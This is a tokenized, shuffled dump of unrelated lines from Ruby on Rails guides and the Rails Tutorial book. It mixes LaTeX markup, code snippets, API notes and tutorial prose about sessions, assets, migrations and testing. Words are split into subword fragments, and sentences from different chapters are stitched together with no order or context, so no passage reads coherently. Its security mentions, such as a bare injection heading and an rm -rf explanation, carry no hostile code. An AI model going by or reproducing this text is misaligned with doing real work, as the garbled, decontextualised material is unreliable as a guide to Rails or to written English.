▁stylesheet _ link _ tag ▁: all , ▁cache : ▁true
▁For ▁example , ▁rendering ▁actions ▁from ▁the ▁` PhotosController ` ▁class ▁will ▁use ▁` app / views / layouts / photos ▖ html ▖ erb ` ▁( or ▁` app / views / layouts / photos ▖ builder ` )▖
▁def ▁full _ message
▁Compute s ▁the ▁url ▁to ▁a ▁stylesheet ▁asset ▁in ▁the ▁` app / assets / stylesheets ` ▁directory ▖
▁There ▁are ▁a ▁we al th ▁of ▁Rails ▁resources ▁in ▁store s ▁and ▁on ▁the ▁web --- in de ed , ▁the ▁supply ▁is ▁so ▁rich ▁that ▁it ▁can ▁be ▁over w h el m ing .
▁This ▁code ▁look s ▁fine ▁at ▁the ▁first ▁ s ight ▖
▁person ▖ errors ▖ clear
▁#### # ▁O b f us c ation ▁and ▁ Encoding ▁Injection
▁As ▁a ▁first ▁step ▁toward ▁ en a b l ing ▁more ▁ visible ▁changes , ▁in ▁Section ~\ ref { sec : current _ user } ▁we ' ll ▁retrieve ▁the ▁current ▁user ▁from ▁the ▁database ▁using ▁the ▁id ▁in ▁the ▁session .
▁We ' ll ▁then ▁complete ▁user ▁login ▁in ▁Section ~\ ref { sec : login _ success } ▁by ▁adding ▁the ▁necessary ▁session - manipulati on ▁code .
▁M any ▁examples ▁in ▁this ▁book ▁use ▁command - line ▁commands .
▁S co p ing ▁allows ▁you ▁to ▁specify ▁common ly - used ▁queries ▁which ▁can ▁be ▁reference d ▁as ▁method ▁calls ▁on ▁the ▁association ▁objects ▁or ▁models ▖
▁We ▁could ▁enforce ▁this ▁at ▁the ▁controller ▁layer , ▁but ▁it ' s ▁convention al ▁to ▁put ▁it ▁in ▁the ▁model ▁and ▁use ▁Active ▁Record ▁to ▁enforce ▁the ▁constraint .
▁$ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup ▁-- queue ▁ ur g ent
▁ Adding ▁microposts ▁creation ▁to ▁the ▁Home ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ }{/ }) .
▁( Write ▁a ▁test ▁first ▖)
▁* ▁` config ▖ action _ dispatch ▖ encrypted _ cookie _ s alt ` ▁set s ▁the ▁ encrypted ▁cookies ▁ s alt ╼ value ▖
▁render ▁: edit
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁day s ▁that ▁defaults ▁to ▁the ▁day ▁for ▁the ▁date ▁provided
▁I ' ve ▁done ▁my ▁best ▁to ▁cover ▁some ▁of ▁the ▁most ▁common ▁cases , ▁but ▁the ▁only ▁general ▁solution ▁is ▁web ▁search es ▁and ▁ de term in ation .
▁It ▁failed .
▁ Compar ing ▁Figure ~\ ref { fig : login _ mockup } ▁with ▁Figure ~\ ref { fig : signup _ mockup }, ▁we ▁see ▁that ▁the ▁login ▁form ▁is ▁similar ▁in ▁appearance ▁to ▁the ▁signup ▁form , ▁except ▁with ▁two ▁fields ▁( email ▁and ▁password ) ▁in ▁place ▁of ▁four .
▁x ▁ += ▁1
▁@ order ▁= ▁@ customer ▖ orders ▖ build ( order _ date : ▁Time ▖ now ,
▁Do ▁not ▁expect ▁that ▁the ▁issue ▁report ▁will ▁automatically ▁see ▁any ▁a c t i v ity ▁or ▁that ▁other s ▁will ▁jump ▁to ▁fix ▁it ▖
▁* ▁` control s : ▁true `, ▁provides ▁browser ▁supplied ▁control s ▁for ▁the ▁user ▁to ▁interact ▁with ▁the ▁ video .
▁You ' ll ▁see ▁all ▁of ▁those ▁paths ▁later ▁in ▁this ▁guide .
▁ Compar e ▁this ▁with ▁including ▁the ▁action ▁names ▁in ▁Listing ~\ ref { code : generating _ pages } ▁and ▁Listing ~\ ref { code : generate _ users _ controller } .
▁This ▁option ╼ will ▁let ▁validation ▁pass ▁if ▁the ▁attribute ' s ▁value ▁is ▁` blank ?` , ▁like ▁` nil ` ▁or ▁an ╼ empty ▁string ▁for ▁example .
▁as ▁show n ▁in ▁Listing ~\ ref { code : settings _ link _ test } .
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" >
▁end
▁The ▁`` forgot ▁password '' ▁link ▁will ▁go ▁to ▁a ▁page ▁with ▁a ▁form ▁that ▁take s ▁in ▁an ▁email ▁address ▁and ▁send s ▁an ▁email ▁containing ▁a ▁password ▁reset ▁link ▁( Figure ~\ ref { fig : forgot _ password _ form _ mockup }) .
▁### ▁` overlap s ?
▁### ▁` to _ formatted _ s `
▁Fin ally , ▁if ▁a ▁block ▁is ▁provided , ▁both ▁` create ` ▁and ▁` new ` ▁will ▁yield ▁the ▁new ╼ object ▁to ▁that ▁block ▁for ▁initialization :
▁As ▁in ▁Chapter ~\ ref { cha : beginning } ▁and ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁I ▁suggest ▁following ▁the ▁`` hello , ▁world !''
▁As ▁a ▁result , ▁we ' ll ▁complete ▁the ▁implementation ▁of ▁secure ▁passwords ▁( and ▁get ▁to ▁a ▁green ▁test ▁suite ) ▁using ▁only ▁a ▁few ▁lines ▁of ▁code .
▁#### ▁` to ( position ) `
▁c attr _ accessor ▁: surname , ▁instance _ accessor : ▁false
▁L e an ▁again st ▁writing ▁tests ▁for ▁code ▁( such ▁as ▁ detailed ▁HTML ▁structure ) ▁likely ▁to ▁change ▁in ▁the ▁future .
▁else
▁( O n ▁the ▁cloud ▁IDE , ▁< your ▁system > ▁is ▁U b un t u ▖)
▁find ~ by
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ year , ▁ month , ▁day , ▁ hour , ▁and ▁ minute ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁ datetime - base d ▁attribute .
▁false ▖ duplicable ?
▁The ▁code ▁itself ▁look s ▁like ▁this :
▁In ▁particular , ▁0 ▁and ▁0▖0 ▁are ▁** not ** ▁blank .
▁This ▁is ▁a ▁( nearly ) ▁ com pre h en s ive ▁list ▁of ▁difference s ▁between ▁the ▁2 nd ▁ edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁and ▁the ▁present ▁version .
▁The ▁` Blorgh :: Article ` ▁model ▁should ▁then ▁have ▁some ▁code ▁to ▁convert ▁the ▁` author _ name `╼ field ▁into ▁an ▁actual ▁` User ` ▁object ▁and ▁associate ▁it ▁as ▁that ▁article ' s ▁` author `╼ before ▁the ▁article ▁is ▁saved ▖
▁* ▁Action ▁Pack ' s ▁ internal ▁ Middleware ▁ stack .
▁* ▁How ▁Rails ' ▁built - in ▁helpers ▁as s ist ▁you .
▁ ╼ ▁=> ▁Sun , ▁1 3 ▁Mar ▁2011 ▁0 3 : 38 : 55 ▁UTC ▁+00:00
▁It ▁is ▁possible ▁to ▁do ▁so , ▁but ▁experience ▁shows ▁that ▁direct ▁tests ▁of ▁cookie ▁values ▁are ▁brittle ▁and ▁have ▁a ▁t end en c y ▁to ▁rely ▁on ▁implementation ▁details ▁that ▁some times ▁change ▁from ▁one ▁Rails ▁release ▁to ▁the ▁next .
▁In ▁this ▁chapter , ▁we ' ll ▁take ▁the ▁first ▁ critical ▁step ▁by ▁creating ▁a ▁\ emph { data ▁model } ▁for ▁users ▁of ▁our ▁site , ▁together ▁with ▁a ▁way ▁to ▁store ▁that ▁data .
▁This ▁guide ▁document s ▁the ▁Ruby ▁on ▁Rails ▁API ▁documentation ▁ guidelines .
▁However , ▁because ▁you ▁are ▁developing ▁the ▁` blorgh ` ▁engine ▁on ▁your ▁local ▁machine ,╼ you ▁will ▁need ▁to ▁specify ▁the ▁`: path ` ▁option ▁in ▁your ▁` Gemfile `:
▁Whi le ▁we ' re ▁look ing ▁at ▁the ▁routes ▁file , ▁let ' s ▁take ▁a ▁moment ▁to ▁associate ▁the ▁root ▁route ▁with ▁the ▁users ▁index , ▁so ▁that ▁`` slash '' ▁go es ▁to ▁ / users .
▁# ▁Blorgh / app / models / article ▖ rb
▁Here ▁is ▁a ▁ summary ▁of ▁the ▁steps ▁show n ▁in ▁Figure ~\ ref { fig : mvc _ detailed } :
▁╼╼\ end { enumerate }╼╼ ▁% ▁subsection ▁micropost _ validations ▁( end )╼╼ ▁\ subsection { User / Micropost ▁associations } ▁% ▁( fold )╼ ▁\ label { sec : user _ micropost _ associations }╼╼
▁To ▁create ▁the ▁\ k ode { relationships } ▁table , ▁we ▁ migrate ▁the ▁database ▁as ▁usual :
▁The ▁Rails ▁Way T M ▁is ▁to ▁use ▁migrations ▁every ▁time ▁we ▁ discover ▁that ▁our ▁data ▁model ▁needs ▁to ▁change .
▁* ▁` create _ association !(
▁if ▁@ user ▁&& ▁@ user ▖ guest ?
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁Inde ed , ▁if ▁we ▁have ▁a ▁large ▁number ▁of ▁records , ▁the ▁entire ▁collection ▁may ▁ ex ce ed ▁the ▁amount ▁of ▁memory ▁available .
▁Under ▁the ▁h ood , ▁this ▁command ▁execute s ▁the ▁\ k ode { drop \_ table } ▁command ▁to ▁remove ▁the ▁users ▁table ▁from ▁the ▁database .
▁You ▁can ▁call ▁this ▁remote ▁what ever ▁you ' d ▁like , ▁but ▁if ▁you ▁don ' t ▁use ▁` upstream ` ,╼ the n ▁change ▁the ▁name ▁to ▁your ▁own ▁in ▁the ▁instructions ▁below .
▁A ▁diagram ▁of ▁the ▁data ▁model ▁appears ▁in ▁Figure ~\ ref { fig : user _ has _ many _ following } .
▁This ▁defines ▁a ▁task ▁\ k ode { db : populate } ▁that ▁creates ▁an ▁example ▁user ▁with ▁name ▁and ▁email ▁address ▁re p li cat ing ▁our ▁previous ▁one , ▁and ▁then ▁make s ▁ 99 ▁more .
▁The ▁result ▁of ▁the ▁deployment ▁should ▁be ▁a ▁working ▁sample ▁application ▁on ▁the ▁production ▁server ▁( Figure ~\ ref { fig : layout _ production }) .
▁A lthough ▁\ k ode { touch } ▁is ▁design ed ▁to ▁update ▁the ▁modification ▁timestamp ▁of ▁a ▁file ▁or ▁directory ▁without ▁otherwise ▁a ffect ing ▁it , ▁as ▁a ▁ side - e ffect ▁it ▁creates ▁a ▁new ▁( blank ) ▁file ▁if ▁one ▁doesn ' t ▁already ▁exist .
▁It ▁creates ▁a ╼ h y p er link ▁base d ▁on ▁text ▁to ▁display ▁and ▁where ▁to ▁go ▁- ▁in ▁this ▁case , ▁to ▁the ▁path ╼ for ▁articles .
▁Now ▁we ' ll ▁get ▁our ▁title ▁tests ▁to ▁pass , ▁and ▁at ▁the ▁same ▁time ▁add ▁the ▁full ▁HTML ▁structure ▁needed ▁to ▁make ▁valid ▁web ▁pages .
▁ ╼ ▁sample ▁application .
▁In ▁particular , ╼` qualified _ constant _ defined ?` ▁accept s ▁an ▁optional ▁second ▁argument ▁to ▁be ╼ able ▁to ▁say ▁whether ▁you ▁want ▁the ▁ predicate ▁to ▁look ▁in ▁the ▁ ance st or s .
▁This ▁is ╼ so ▁you ▁can ▁easily ▁add ▁asset ▁p ip el in ing ▁later ▁if ▁you ▁like .
▁The ╼` require _ tree ` ▁ directive ▁in ▁a ▁CSS ▁manifest ▁works ▁the ▁same ▁way ▁as ▁the ▁JavaScript ╼ one , ▁ requiring ▁all ▁stylesheets ▁from ▁the ▁current ▁directory .
▁Now ▁that ▁we ▁have ▁a ▁user ▁model ▁to ▁ play ▁with , ▁we ▁will ▁just ▁edit ▁the ╼` app / controllers / users _ controller ▖ rb ` ▁make ▁it ▁in str u c t ▁the ▁` User Mailer ` ▁to ▁ deliver ╼ an ▁email ▁to ▁the ▁new ly ▁created ▁user ▁by ▁edit ing ▁the ▁create ▁action ▁and ▁insert ing ▁a ╼ call ▁to ▁` User Mailer ▖ welcome _ email ` ▁right ▁after ▁the ▁user ▁is ▁successfully ▁saved .
▁I ma g in e ▁that ▁you ▁did ▁have ▁an ▁asset ▁located ▁at ╼` app / assets / stylesheets / blorgh / style ▖ css ` ▁To ▁include ▁this ▁asset ▁inside ▁an ╼ application , ▁just ▁use ▁` stylesheet _ link _ tag ` ▁and ▁reference ▁the ▁asset ▁as ▁if ▁it ╼ we re ▁inside ▁the ▁engine :
▁We ▁can ▁double - check ▁this ▁by ▁verify ing ▁that ▁the ▁relevant ▁tests ▁fail :
▁The ▁second ▁\ k ode { link \_ to } ▁shows ▁off ▁the ▁\ k ode { image \_ tag } ▁helper , ▁which ▁take s ▁as ▁arguments ▁the ▁path ▁to ▁an ▁image ▁and ▁an ▁optional ▁options ▁hash , ▁in ▁this ▁case ▁setting ▁the ▁\ k ode { alt } ▁attribute ▁of ▁the ▁image ▁tag ▁using ▁symbols .
▁And ▁when ▁other ▁framework s ▁develop ▁successful ▁new ▁technique s , ▁Rails ▁ creator ▁\ href { http :// lo u d th in k ing ▖ com /}{ David ▁H einemeier ▁Hansson } ▁and ▁the ▁\ href { http :// rubyonrails ▖ org / core } { Rails ▁ core ▁team } ▁don ' t ▁he s it ate ▁to ▁incorporate ▁their ▁idea s .
▁### ▁` re order `
▁message ▁by ▁\ href { http :// l m gt fy ▖ com /}{ Go o g l ing ▁it }, ▁or ▁when ▁to ▁give ▁up ▁and ▁just ▁re b oo t ▁the ▁d ar n ▁thing ▖ ╼╼ Because ▁web ▁applications ▁have ▁so ▁many ▁mov ing ▁parts , ▁they ▁offer ▁ amp le ▁opportunit ies ▁to ▁develop ▁your ▁technical ▁ sophistication ▖ ▁In ▁the ▁context ▁of ▁Rails ▁web ▁development , ▁some ▁specific ▁examples ▁of ▁technical ▁ sophistication ▁include ▁making ▁sure ▁you ' re ▁using ▁the ▁right ▁Ruby ▁gem ▁versions , ▁running ▁\ text tt { bundle ▁install } ▁or ▁\ text tt { bundle ▁update }, ▁and ▁restart ing ▁the ▁local ▁ webserver ▁if ▁something ▁doesn ' t ▁work ▖ ▁( Don ' t ▁worry ▁if ▁all ▁this ▁ s ound s ▁like ▁g i b be ri sh ; ▁we ' ll ▁cover ▁everything ▁mentioned ▁here ▁in ▁the ▁course ▁of ▁complet ing ▁this ▁tutorial ▖ )╼╼ As ▁you ▁proceed ▁through ▁this ▁tutorial , ▁in ▁all ▁like li h ood ▁you ▁will ▁ o cc as ion ally ▁be ▁tri p ped ▁up ▁by ▁things ▁not ▁immediately ▁working ▁as ▁expected ▖ ▁A lthough ▁some ▁particular ly ▁trick y ▁steps ▁are ▁explicitly ▁highlight ed ▁in ▁the ▁text , ▁it ▁is ▁ im possibl e ▁to ▁an tic ip ate ▁all ▁the ▁things ▁that ▁can ▁go ▁wrong ▖ ▁I ▁recommend ▁you ▁e mb ra ce ▁these ▁in evi table ▁ st um b l ing ▁blocks ▁as ▁opportunit ies ▁to ▁work ▁on ▁i mprov ing ▁your ▁technical ▁ sophistication ▖ ▁Or , ▁as ▁we ▁say ▁in ▁\ href { https :// www ▖ learn en ough ▖ com / command - line - tutorial # aside - speak _ ge e k } { ge e k ▁ speak } : ▁\ emph { It ' s ▁not ▁a ▁bug , ▁it ' s ▁a ▁feature ! }╼╼\ end { aside }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / tech _ support _ cheat _ sheet ▖ png }╼\ end { center }╼\ caption { ` ` \ href { https :// m ▖ xkcd ▖ com / 6 27 /}{ T e ch ▁Support ▁C h e at ▁Sheet } '' ▁( via ▁\ href { http :// xkcd ▖ com /}{ xkcd }) ▖ ▁\ label { fig : tech _ support _ cheat _ sheet } }╼\ end { figure }╼╼ ╼ The ▁\ emph {
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / with _ options ▖ rb ` .
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁removed _ at ▁ IS ▁NULL
▁< script ▁src ="/ javascripts / all ▖ js "></ script >
▁The ▁`: on ` ▁option ▁take s ▁one ▁of ▁the ▁values ╼` : create ` ▁or ▁`: update ` ▖
▁The ▁\ k ode { - r f } ▁flag ▁means ▁`` recursive ▁ force '' , ▁which ▁ recursive ly ▁remove s ▁all ▁files , ▁directories , ▁subdirectories , ▁and ▁so ▁on , ▁without ▁as k ing ▁for ▁explicit ▁confirmation ▁of ▁each ▁deletion .
▁As ▁with ▁the ▁generated ▁user ▁fixture ▁( Listing ~\ ref { code : default _ fixtures }), ▁the ▁generated ▁relationship ▁fixture ▁also ▁violat es ▁the ▁uniqueness ▁constraint ▁ im po s ed ▁by ▁the ▁corresponding ▁migration ▁( Listing ~\ ref { code : relationships _ migration }) .
▁b section ▁image _ upload _ in _ production ▁( end )╼╼ ▁% ▁section ▁micropost _ images ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : user _ microposts _ co nclusion }╼╼ With ▁the ▁addition ▁of ▁the ▁Microposts ▁resource , ▁we ▁are ▁ nearly ▁ finished ▁with ▁our ▁sample ▁application .
▁In ▁order ▁to ▁forward ▁users ▁to ▁their ▁intend ed ▁d est in ation , ▁we ▁need ▁to ▁store ▁the ▁location ▁of ▁the ▁request ed ▁page ▁some where , ▁and ▁then ▁redirect ▁to ▁that ▁location ▁instead .
▁F a ile d ▁signup ▁with ▁error ▁messages .
▁The ▁ability ▁to ▁save ▁a ▁secure ly ▁ hashed ▁\ k ode { password \_ digest } ▁attribute ▁to ▁the ▁database
▁Ou r ▁method ▁will ▁be ▁to ▁start ▁with ▁a ▁\ emph { valid } ▁model ▁object , ▁set ▁one ▁of ▁its ▁attributes ▁to ▁something ▁we ▁want ▁to ▁be ▁invalid , ▁and ▁then ▁test ▁that ▁it ▁in ▁fact ▁is ▁invalid .
▁def ▁validate
▁( As ▁noted ▁in ▁Section ~\ ref { sec : con ve n tion s }, ▁vertical ▁do t s ▁indicate ▁omitted ▁code ▁and ▁should ▁not ▁be ▁copie d ▁literal ly ▖)
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ valid _ submission })▖)
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts .
▁| app / | C on tain s ▁the ▁controllers , ▁models , ▁views , ▁helpers , ▁ mailers ▁and ▁assets ▁for ▁your ▁application ▖
▁Fix ing ▁this ▁minor ▁blemish ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ testing _ the _ remember _ me _ box }), ▁but ▁for ▁now ▁we ▁can ▁just ▁test ▁to ▁see ▁if ▁the ▁relevant ▁cookie ▁is ▁\ k ode { nil } ▁or ▁not .
▁The ▁micropost ▁count ▁ assert ion ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁uses ▁\ k ode { response ▖ body }, ▁which ▁we ▁saw ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : password _ reset } ▁ exercises ▁( Section ~\ ref { sec : exercises _ password _ reset _ test }) .
▁It ' s ▁also ▁easy ▁to ▁add ▁new ▁helpers ▁to ▁your ▁application ▁as ▁it ▁e v ol ve s .
▁The ▁reason ▁we ▁iterate ▁through ▁all ▁possible ▁key / value ▁pair s ▁is ▁so ▁that ▁we ▁can ▁include ▁other ▁kind s ▁of ▁flash ▁messages .
▁<%= ▁asset _ path ▁' image ▖ png ', ▁host : ▁' my cdn subdomain ▖ fi ctional - cdn ▖ com ' ▁%>
▁in ▁Listing ~\ ref { code : remember _ me _ ternary } .
▁<% # ▁ W R ON G ▁%>
▁Let ' s ▁consider ▁the ▁latter ▁first .
▁En able s ▁the ▁format ting ▁of ▁number s ▁in ▁a ▁variety ▁of ▁ways .
▁This ▁code ▁has ▁a ▁form id able ▁combination ▁of ▁Rails , ▁Ruby , ▁and ▁SQL , ▁but ▁it ▁does ▁the ▁job , ▁and ▁does ▁it ▁well .
▁You ▁may ▁want ▁to ▁further ▁restrict ▁access , ▁using ▁environment - specific ▁versions ▁of ▁these ▁files ▁and ▁any ▁other s ▁that ▁may ▁contain ▁ sensitive ▁information .
▁# ▁calling ▁+ to _ s + ▁on ▁all ▁elements ▁and ▁join ing ▁them .
▁The ▁big g est ▁difference ▁is ▁that , ▁while ▁any one ▁can ▁sign ▁up , ▁only ▁the ▁current ▁user ▁should ▁be ▁able ▁to ▁update ▁his ▁information .
▁ foo => ▁nil
▁* ▁`: password ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁password ▁in ▁this ▁setting .
▁-> ▁ { ▁where ▁" factory ▁= ▁' S eattle ' " ▁ }
▁This ▁option ▁defaults ▁to ▁an ▁instance ▁of ▁` ActiveSupport :: Logger :: Simple Form at ter ` ▁for ▁all ▁mode s ▁except ▁production , ▁where ▁it ▁defaults ▁to ▁` Logger :: Form at ter ` .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁from ▁Listing ~\ ref { code : initial _ edit _ action }, ▁the ▁edit ▁page ▁should ▁render ▁properly , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : edit _ page } .
▁ qualified _ name ▁= ▁ qualified _ name _ for ▁from _ mod , ▁ const _ name
▁The ▁result , ▁with ▁migration ▁name ▁\ k ode { add \_ password \_ digest \_ to \_ users }, ▁appears ▁as ▁follows :
▁Because ▁of ▁this ▁ danger , ▁it ▁is ▁essential ▁that ▁we ▁only ▁update ▁attributes ▁that ▁are ▁ safe ▁to ▁edit ▁through ▁the ▁web .
▁The ╼[ R out es ](# routes ) ▁section ▁of ▁this ▁guide ▁describe s ▁it ▁in ▁detail .
▁creates ▁\ emph { attribute ▁ accessor s } ▁corresponding ▁to ▁a ▁user ' s ▁name ▁and ▁email ▁address .
▁Ou r ▁eventual ▁goal ▁for ▁the ▁user ▁profile ▁pages ▁is ▁to ▁show ▁the ▁user ' s ▁profile ▁image , ▁basic ▁user ▁data , ▁and ▁a ▁list ▁of ▁microposts , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : profile _ mockup }
▁Now ▁we ' re ▁ready ▁to ▁write ▁the ▁first ▁signin ▁element , ▁the ▁\ k ode { sign \_ in } ▁function ▁itself .
▁=> ▁" mhartl @ example ▖ com "
▁# ▁Generate ▁digest s ▁for ▁assets ▁URLs
▁* ▁Re s c ue s ▁any ▁exception ▁returned ▁by ▁the ▁application ▁and ▁calls ▁an ▁exception s ▁app ▁that ▁will ▁wrap ▁it ▁in ▁a ▁format ▁for ▁the ▁end ▁user .
▁" digest ":" 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2 " }, " favicon - a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 ▖ ic o ":{" logical _ path ":" favicon ▖ ic o "," m time " : "2013-0 7-2 6 T 23 :00 : 10 - 07 :00 "," size " : 140 6 ,
▁As ▁implie d ▁by ▁the ▁tests , ▁the ▁application ▁code ▁uses ▁the ▁same ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁to ▁respond ▁to ▁the ▁Ajax ▁requests ▁that ▁it ▁uses ▁to ▁respond ▁to ▁ordinar y ▁\ text tt { POST } ▁and ▁\ text tt { DELETE } ▁HTTP ▁requests .
▁If ▁your ▁tests ▁are ▁failing ▁when ▁you ▁think ▁they ▁should ▁be ▁passing , ▁ q u it ▁the ▁Spork ▁server ▁with ▁\ text tt { Ctrl - C } ▁and ▁restart ▁it :
▁options
▁Even ▁though ▁the ▁tests ▁are ▁passing , ▁you ▁m ight ▁have ▁notice d ▁this ▁code :
▁``` coffee script
▁Fin ally , ▁a lthough ▁there ' s ▁no ▁ ir on - c la d ▁way ▁to ▁stop ▁attacker s ▁who ▁have ▁ ph y s ical ▁access ▁to ▁a ▁logged - in ▁computer , ▁we ' ll ▁ mini m ize ▁the ▁four th ▁problem ▁by ▁changing ▁token s ▁every ▁time ▁a ▁user ▁log s ▁out ▁and ▁by ▁tak ing ▁care ▁to ▁\ emph { crypt o gr a ph ical ly ▁sign } ▁any ▁ potentially ▁ sensitive ▁information ▁we ▁place ▁on ▁the ▁browser .
▁#### # ▁` prev _ month `, ▁` next _ month `
▁It ▁should ▁look ▁something ▁like ▁the ▁following :
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { real ▁sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁Ou r ▁plan ▁is ▁to ▁display ▁the ▁microposts ▁for ▁each ▁user ▁on ▁their ▁respective ▁profile ▁page ▁(\ k ode { show ▖ html ▖ erb }), ▁together ▁with ▁a ▁running ▁count ▁of ▁how ▁many ▁microposts ▁they ' ve ▁made .
▁If ▁there ▁are ▁no ▁digest s ▁in ▁the ▁filename s , ▁and ▁far - future ╼ headers ▁are ▁set , ▁remote ▁clients ▁will ▁ never ▁know ▁to ▁ ref e t ch ▁the ▁files ▁when ▁their ╼ content ▁changes .
▁* ▁Provide s ▁ prepare ▁and ▁ cleanup ▁callbacks , ▁intend ed ▁to ▁as s ist ▁with ▁code ▁ reload ing ▁during ▁development .
▁table _ name ▖ pluralize ▁: ▁table _ name
▁The ▁` find _ by !` ▁method ▁be have s ▁exactly ▁like ▁` find _ by `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found ▖
▁in ▁Listing ~\ ref { code : generate _ users _ controller } .
▁* ▁` set _ autoload _ paths ` ▁This ▁initializer ▁run s ▁before ▁` bootstrap _ hook ` ▖
▁#### ▁General ▁ Engine ▁Configuration
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 9 ) ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M i li t ary _ s lang # S N A F U } { s na f us } .
▁╼╼ ▁\ subsection { What ▁good ▁does ▁Git ▁do ▁you ?} ╼ ▁\ label { sec : what _ g ood _ does _ git _ do _ you }╼╼ If ▁you ' ve ▁ never ▁used ▁version ▁control ▁before , ▁it ▁may ▁not ▁be ▁entire ly ▁clear ▁at ▁this ▁point ▁what ▁good ▁it ▁does ▁you , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁To ▁do ▁this , ▁we ' ll ▁edit ▁the ▁Rails ▁\ emph { route r }, ▁which ▁ s it s ▁in ▁front ▁of ▁the ▁controller ▁in ▁Figure ~\ ref { fig : MVC } ▁and ▁determine s ▁where ▁to ▁send ▁requests ▁that ▁come ▁in ▁from ▁the ▁browser .
▁#### # ▁` beginning _ of _ day `, ▁` end _ of _ day `
▁In ▁the ▁case ▁above , ▁you ▁would ▁need ▁to ▁add ▁a ▁column ▁named ▁` orders _ count ` ▁to ▁the ▁` Customer ` ▁model ▖
▁As ▁a ▁result ▁of ▁my ▁perform ing ▁this ▁step , ▁you ▁can ▁find ▁the ▁\ href { https :// github ▖ com / railstutorial / sample _ app _ rails _ 4 } { Rails ▁Tutorial ▁sample ▁application ▁code ▁on ▁GitHub } ▁( un d er ▁the ▁user name ▁\ text tt { railstutorial } ▁and ▁the ▁slightly ▁different ▁name ▁\ text tt { sample \_ app \_ rails \_ 4 })
▁person ▖ errors ▖ messages
▁# ▁ SELECT ▁id ▁FROM ▁people
▁If ▁a ▁line ▁is ▁too ▁long , ▁the ▁comment ▁may ▁be ▁placed ▁on ▁the ▁next ▁line :
▁ From ▁the ▁controller ' s ▁point ▁of ▁view , ▁there ▁are ▁three ▁ways ▁to ▁create ▁an ▁HTTP ▁response :
▁For ▁many ▁uses , ▁the ▁two ▁types ▁of ▁strings ▁are ▁effective ly ▁identical :
▁The ▁methods ▁` monday ` ▁and ▁` sunday ` ▁return ▁the ▁date s ▁for ▁the ▁previous ▁Mon day ▁and ╼ next ▁Sun day , ▁respectively .
▁In ▁Section ~\ ref { sec : adding _ to _ the _ layout }, ▁we ▁ associated ▁many ▁of ▁the ▁HTML ▁elements ▁with ▁CSS ▁classes , ▁which ▁gives ▁us ▁consider able ▁flexibility ▁in ▁construct ing ▁a ▁layout ▁base d ▁on ▁CSS .
▁page ▖ email s ▖ create (
▁You ▁could ▁set ▁that ▁up ▁this ▁way :
▁<%= = ▁@ cm s ▖ current _ template ▁%> ▁<% # ▁insert s ▁@ cm s ▖ current _ template ▁as ▁is ▁%>
▁=> ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G TE m T 0 j U 7 ▖ n c B J / 60 g H q "
▁#### # ▁` collection ▖ build ( attributes ▁= ▁{}) `
▁map ▁ { ▁| attribute , ▁message | ▁full _ message ( attribute , ▁message ) ▁ }
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁only ▁one ▁user ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ index _ only _ one _ bootstrap - full ▖ png }{( full ▁size )}
▁The ▁second ▁method ▁we ' ll ▁need ▁is ▁\ k ode { html }, ▁which ▁update s ▁the ▁HTML ▁inside ▁the ▁relevant ▁element ▁with ▁the ▁contents ▁of ▁its ▁argument .
▁For ▁instance , ▁consider ▁a ▁user ▁who ▁follows ▁a ▁second ▁user : ▁we ▁could ▁say ▁that , ▁e ▖ g ▖ , ▁ Calvin ▁is ▁following ▁ Hobbes , ▁and ▁ Hobbes ▁is ▁followed ▁by ▁ Calvin , ▁so ▁that ▁ Calvin ▁is ▁the ▁\ emph { follower } ▁and ▁ Hobbes ▁is ▁\ emph { followed } .
▁The ▁ sum ▁of ▁an ▁empty ▁receiver ▁can ▁be ▁customize d ▁in ▁this ▁form ▁as ▁well :
